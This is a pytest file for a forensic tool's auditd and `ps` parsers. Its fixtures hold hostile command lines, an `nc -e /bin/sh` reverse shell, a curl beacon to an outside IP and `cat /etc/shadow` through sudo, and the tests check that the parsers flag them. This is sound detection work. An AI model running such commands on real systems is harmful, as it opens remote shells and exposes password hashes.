"""Unit tests for the process-execution parsers (scenario #6).

Two already-collected-but-unparsed sources:
  - /var/log/audit/audit.log  (auditd execve records, epoch timestamps)
  - volatile/ps.txt           (`ps aux` snapshot, no per-process timestamp)
"""
from pathlib import Path

import pytest

from lfa.parsers.base import ParseContext
from lfa.parsers.execution import AuditdParser, PsParser
from lfa.schema import validate
from lfa.timeeng import TimeContext


@pytest.fixture
def ctx(tmp_path):
    return ParseContext(
        case_id="CASE-01",
        host_id="HOST-01",
        raw_host_dir=tmp_path,
        time_ctx=TimeContext("UTC", "assumed_utc"),
        distro_profile={"distro_id": "ubuntu"},
        artifact_sha256="0" * 64,
        artifact_mtime=1700000000.0,
    )


def _parse(parser, tmp_path, ctx, text, rel):
    f = tmp_path / "artifact"
    f.write_text(text, encoding="utf-8")
    ctx.artifact_rel = rel
    ctx.parser_name = parser.name
    ctx.parser_version = parser.version
    return list(parser.parse(f, ctx))


# ------------------------------------------------------------------- auditd

def test_auditd_execve_pair_becomes_one_timed_event(tmp_path, ctx):
    log = (
        'type=SYSCALL msg=audit(1614556800.123:456): arch=c000003e syscall=59 '
        'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 '
        'comm="curl" exe="/usr/bin/curl" key="exec"\n'
        'type=EXECVE msg=audit(1614556800.123:456): argc=3 a0="curl" a1="-s" '
        'a2="http://203.0.113.9/beacon"\n'
    )
    events = _parse(AuditdParser(), tmp_path, ctx, log, "var/log/audit/audit.log")
    assert len(events) == 1
    ev = events[0]
    assert validate(ev) == []
    assert ev.subcategory == "process_execution"
    assert ev.category == "user_activity"
    assert ev.timestamp_confidence == "exact"
    assert ev.timestamp_utc == "2021-03-01T00:00:00.123000+00:00"
    assert ev.actor_process == "curl"
    assert ev.actor_uid == 1000  # auid (login uid), the accountable actor
    assert "curl -s http://203.0.113.9/beacon" in ev.description


def test_auditd_reverse_shell_is_high_severity(tmp_path, ctx):
    log = (
        'type=SYSCALL msg=audit(1614556801.000:457): syscall=59 auid=1000 uid=0 '
        'comm="nc" exe="/usr/bin/nc" key="exec"\n'
        'type=EXECVE msg=audit(1614556801.000:457): argc=5 a0="nc" a1="-e" '
        'a2="/bin/sh" a3="10.0.0.1" a4="4444"\n'
    )
    events = _parse(AuditdParser(), tmp_path, ctx, log, "var/log/audit/audit.log")
    assert len(events) == 1
    assert events[0].severity == "high"


def test_auditd_non_execve_syscall_ignored(tmp_path, ctx):
    log = (
        'type=SYSCALL msg=audit(1614556802.000:458): syscall=2 success=yes '
        'comm="cat" exe="/bin/cat"\n'
    )
    events = _parse(AuditdParser(), tmp_path, ctx, log, "var/log/audit/audit.log")
    assert events == []


def test_auditd_user_cmd_is_sudo_execution(tmp_path, ctx):
    log = (
        'type=USER_CMD msg=audit(1614556803.000:459): pid=900 uid=1000 auid=1000 '
        "msg='cwd=\"/home/kali\" cmd=\"cat /etc/shadow\" terminal=pts/0 "
        "res=success'\n"
    )
    events = _parse(AuditdParser(), tmp_path, ctx, log, "var/log/audit/audit.log")
    assert len(events) == 1
    ev = events[0]
    assert ev.subcategory == "sudo_execution"
    assert ev.category == "privilege_escalation"
    assert "cat /etc/shadow" in ev.description


# ----------------------------------------------------------------------- ps

_PS = (
    "# captured_utc: 2026-09-12T10:00:00Z\n"
    "# command: ps aux\n"
    "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
    "root         1  0.0  0.1 168124 11876 ?        Ss   Sep10   0:03 /sbin/init\n"
    "kali       999  0.1  0.5   2000  1000 pts/0    S+   10:00   0:00 nc -e /bin/sh 10.0.0.1 4444\n"
)


def test_ps_snapshot_lists_running_processes(tmp_path, ctx):
    events = _parse(PsParser(), tmp_path, ctx, _PS, "volatile/ps.txt")
    assert len(events) == 2
    for ev in events:
        assert validate(ev) == []
        assert ev.subcategory == "running_process"
        assert ev.category == "user_activity"
        assert ev.timestamp_confidence == "unknown"

    init = events[0]
    assert init.actor_user == "root"
    assert init.actor_process == "/sbin/init"
    assert init.severity == "info"


def test_ps_flags_suspicious_process(tmp_path, ctx):
    events = _parse(PsParser(), tmp_path, ctx, _PS, "volatile/ps.txt")
    evil = events[1]
    assert evil.actor_user == "kali"
    assert evil.severity == "medium"
    assert "nc -e /bin/sh" in evil.description


def test_ps_header_and_comments_skipped(tmp_path, ctx):
    events = _parse(PsParser(), tmp_path, ctx,
                    "# captured_utc: x\nUSER PID COMMAND\n", "volatile/ps.txt")
    assert events == []
